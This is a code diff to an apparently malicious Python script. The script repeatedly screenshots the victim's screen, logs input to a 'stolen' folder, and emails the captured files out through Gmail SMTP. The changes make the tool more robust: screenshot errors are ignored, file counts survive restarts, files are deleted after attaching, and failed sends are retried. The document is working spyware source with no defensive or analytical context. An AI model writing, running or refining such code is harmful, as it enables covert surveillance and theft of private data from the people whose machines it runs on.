@@ -41,17 +41,22 @@ def attach_file_to_email(message, filename):
 
 
 if __name__ == "__main__":
-    if login=="" or password=="":
-        raise(TypeError("Type your login and app password for your gmail"))
+    picturesNum = 0
+    if login == "" or password == "":
+        raise (TypeError("Type your login and app password for your gmail"))
     if not os.path.exists("stolen"):
         os.mkdir("stolen")
-        with open("stolen\log.txt", 'w'):
-            pass
+        with open("stolen\log.txt", 'w') as f:
+            f.write("INPUT SINCE LAST SEND:\n")
+    else:
+        picturesNum = len(os.listdir("stolen"))
     port = 465
-    picturesNum = 0
     message = create_mes()
     while True:
-        myScreenshot = pyautogui.screenshot()
+        try:
+            myScreenshot = pyautogui.screenshot()
+        except:
+            continue
         name = time.asctime().split(" ")
         name.pop(2)
         name += name[3].split(':')
@@ -64,6 +69,11 @@ if __name__ == "__main__":
         filename = os.listdir("stolen")
         for name in filename:
             attach_file_to_email(message, name)
+            if name == "log.txt":
+                with open("stolen\log.txt", 'w') as f:
+                    f.write("INPUT SINCE LAST SEND:\n")
+                continue
+            os.remove("stolen\\" + name)
         text = message.as_string()
         context = ssl.create_default_context()
         try:
@@ -73,13 +83,8 @@ if __name__ == "__main__":
                     login, login, text
                 )
         except Exception:
+            message = create_mes()
             continue
         print('Sent')
-        for name in filename:
-            if name == "log.txt":
-                with open("stolen\\" + name, 'a') as f:
-                    f.write(f"{'-' * 50}NEW{'-' * 50}\n")
-                continue
-            os.remove("stolen\\" + name)
         message = create_mes()
         picturesNum = 0
